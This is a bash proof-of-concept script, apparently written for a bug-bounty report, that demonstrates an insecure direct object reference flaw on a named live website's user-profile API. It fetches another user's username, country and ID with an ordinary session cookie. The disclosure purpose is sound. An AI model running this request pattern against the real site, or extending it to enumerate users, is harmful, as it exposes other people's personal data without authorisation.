#!/bin/bash

# IDOR Vulnerability Test Script
# -------------------------------------------
# Purpose:
#   Demonstrate the IDOR vulnerability on the
#   /api/front/users/{user_id} endpoint.
#
# Instructions:
#   1. Replace [YOUR_SESSION_COOKIE] with your own
#      authenticated session cookie from a test account.
#   2. Replace YOUR_USER_ID with your test account ID.
#   3. Replace TARGET_USER_ID with a controlled or placeholder ID.
#
# Ethical Notes:
#   - Do NOT use this script to mass-enumerate users.
#   - Only verify a minimal sample for proof of vulnerability.
#   - No user data should be stored, logged, or processed beyond confirmation.
#
# Dependencies:
#   - jq (for parsing JSON output)
#   - curl (for HTTP requests)

HANDLE="deoxyribose404"
BASE="https://stripchat.com"
COOKIE="[YOUR_SESSION_COOKIE]"

# Replace with your test account user ID
YOUR_USER_ID=12345

# Replace with a controlled or placeholder user ID
TARGET_USER_ID=67890

echo "=== IDOR Vulnerability Test ==="
echo ""
echo "Test Account User ID: $YOUR_USER_ID"
echo "Target User ID (unauthorized access test): $TARGET_USER_ID"
echo ""

# -------------------------------------------
# Step 1: Access own profile (expected behavior)
# -------------------------------------------
echo "1. Accessing own profile (User ID: $YOUR_USER_ID)..."
OWN_RESPONSE=$(curl -s "$BASE/api/front/users/$YOUR_USER_ID" \
  -H "Cookie: $COOKIE" \
  -H "HackerOne: $HANDLE" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -H "Accept: application/json")

OWN_USERNAME=$(echo "$OWN_RESPONSE" | jq -r '.user.username // "Error retrieving profile"')
echo "   Username: $OWN_USERNAME"
echo "   Status: ✓ Authorized access (expected)"
echo ""

# -------------------------------------------
# Step 2: Access another profile (IDOR test)
# -------------------------------------------
echo "2. Accessing another user's profile (User ID: $TARGET_USER_ID)..."
TARGET_RESPONSE=$(curl -s "$BASE/api/front/users/$TARGET_USER_ID" \
  -H "Cookie: $COOKIE" \
  -H "HackerOne: $HANDLE" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -H "Accept: application/json")

TARGET_USERNAME=$(echo "$TARGET_RESPONSE" | jq -r '.user.username // "Unavailable"')
TARGET_COUNTRY=$(echo "$TARGET_RESPONSE" | jq -r '.user.country // "Unavailable"')
TARGET_ID=$(echo "$TARGET_RESPONSE" | jq -r '.user.id // "Unavailable"')

echo "   User ID: $TARGET_ID"
echo "   Username: $TARGET_USERNAME"
echo "   Country: $TARGET_COUNTRY"
echo "   Status: ⚠️  UNAUTHORIZED ACCESS - IDOR vulnerability confirmed!"
echo ""

# -------------------------------------------
# Summary
# -------------------------------------------
echo "=== Test Summary ==="
echo "This demonstrates that any authenticated user can access any other user's"
echo "profile information by simply changing the user ID parameter in the request."
echo ""
echo "Expected Behavior: 403 Forbidden when accessing other users' profiles"
echo "Actual Behavior: 200 OK with full profile data"
echo ""
echo "=== Test Complete ==="

